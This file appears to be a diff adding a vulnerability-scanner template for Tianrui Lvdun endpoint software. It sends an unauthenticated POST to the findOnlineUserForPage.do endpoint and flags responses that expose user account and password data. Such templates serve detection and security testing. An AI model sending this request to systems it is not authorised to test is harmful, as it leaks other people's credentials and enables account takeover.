@@ -1,0 +1,25 @@
+id: tianrui-findOnlineUserForPage-info-leak
+
+info:
+  name: 天锐绿盾 findOnlineUserForPage 账号密码信息泄露
+  author: tianrui
+  severity: high
+  tags: info-leak,tianrui
+
+http:
+  - raw:
+      - |
+        POST /trwfe/user/findOnlineUserForPage.do HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate
+
+        userName=&deptId=0&page=1&rows=10
+        
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"firstName")
